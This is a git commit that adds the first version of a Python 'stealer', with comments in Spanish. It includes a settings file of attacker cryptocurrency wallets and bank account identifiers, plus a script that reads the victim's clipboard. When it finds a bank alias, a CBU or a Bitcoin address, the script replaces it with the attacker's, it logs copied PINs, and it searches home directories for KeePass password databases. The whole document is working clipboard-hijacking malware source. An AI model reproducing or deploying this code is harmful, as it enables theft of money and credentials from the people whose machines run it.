21343c9338e457cdbb3dd3e1e31681399b9b0e42
mauroeldritch <mauroeldritch@gmail.com>
2022-08-22 20:48:21 -0300

    Primer commit. Stealer base.

---
+++ settings.py
@@ -0,0 +1,19 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+#Datos del atacante
+atacante_wallet_btc = "1ACC62RS9hg8bHGcfUUq5hY2MAgsUcCo59"
+atacante_wallet_eth = "0xd195958Cfb0994e2B64f0452A3E61db6999f5356"
+atacante_wallet_xmr = "47smjUgdQycN9HUDDbQAy5anXpGiXSFhiStTfrsn3rMy369kp7YJ2xVMPLWXe8cuExQkXgLQJfrnXUrZkP2rvMi6PWVEqyM"
+atacante_cbu_cvu = "1430000000000000000000"
+atacante_alias = "MEJOR.STEALER.MUNDIAL"
+
+#Expresiones regulares
+patron_wallet_btc = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
+patron_wallet_eth = "^0x[a-fA-F0-9]{40}$"
+patron_wallet_xmr = "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}"
+patron_cbu_cvu = "^[0-9]{22}$"
+patron_pin = "^[0-9]{4}$"
+patron_alias = "([a-zA-Z0-9]+)(\.[a-zA-Z0-9]+)(\.[a-zA-Z0-9]+)"
+#patron_keepass = "C:\Users\**\*.kdbx"
+patron_keepass = "/home/**/*.kdbx"
---
+++ stealer.py
@@ -0,0 +1,83 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#/***
+# Passwords
+#           => Google Chrome
+#           => Firefox
+#           => Dump credenciales del Sistema
+#***/
+
+import settings
+import pyperclip3 as pc
+import re
+import glob
+
+#1 => Registrar hallazgos en el Log
+def loguear_hallazgo(hallazgo, tipo):
+    #2 => Abrir archivo
+    f = open("no_sospechoso.txt", "a")
+    #3 => Escribir hallazgo y tipo (Wallet, CBU, etc)
+    f.write("Nuevo hallazgo: "+ hallazgo +" ("+ tipo +").\n")
+    #4 => Cerrar archivo
+    f.close()
+
+#1 => Preparar archivos para exfiltrar #//TODO
+def exfiltrar_archivos():
+    pass
+
+#Chequear Alias Bancario
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular (regla que define lo que buscamos)
+mi_patron_alias = re.compile(settings.patron_alias)
+#3 => Comparar portapapeles con reglas de Alias Bancario
+if mi_patron_alias.match(victima_portapapeles):
+    pc.copy(settings.atacante_alias)
+    print("🚨 Encontrado Alias Bancario. Reemplazando... 😈")
+    loguear_hallazgo(victima_portapapeles, "Alias bancario")
+
+#Chequear Clave Bancaria Uniforme / Clave Virtual Uniforme
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular
+mi_patron_cbu = re.compile(settings.patron_cbu_cvu)
+#3 => Comparar portapapeles con reglas de CBU/CVU
+if mi_patron_cbu.match(victima_portapapeles):
+    pc.copy(settings.atacante_cbu_cvu)
+    print("🚨 Encontrado Clave Bancaria/Virtual Uniforme. Reemplazando... 😈")
+    loguear_hallazgo(victima_portapapeles, "CBU/CVU")
+
+#Chequear Wallet BTC
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular
+mi_patron_btc = re.compile(settings.patron_wallet_btc)
+#3 => Comparar portapapeles con reglas de BTC
+if mi_patron_btc.match(victima_portapapeles):
+    pc.copy(settings.atacante_wallet_btc)
+    print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
+    loguear_hallazgo(victima_portapapeles, "Wallet BTC")
+
+
+#TODO: Wallets ETH y XMR
+
+
+#Chequear PIN
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular
+mi_patron_pin = re.compile(settings.patron_pin)
+#3 => Comparar portapapeles con reglas de PIN
+if mi_patron_pin.match(victima_portapapeles):
+    print("🚨 Encontrado PIN. Copiando... 😈")
+    loguear_hallazgo(victima_portapapeles, "PIN")
+
+#1 => Búsqueda de bases de datos de KeepassX en el disco
+bases_keepass = glob.glob(settings.patron_keepass, recursive=True)
+#2 => Registrar cada base de datos en el log
+for base in bases_keepass:
+    loguear_hallazgo(base, "Base Keepass")
+#3 => Si se han encontrado bases de datos, avisar
+if len(bases_keepass) > 0:
+    print("🚨 Encontrada Base de datos Keepass. Copiando... 😈")
+#TODO: Copiar la base de datos al directorio del Stealer
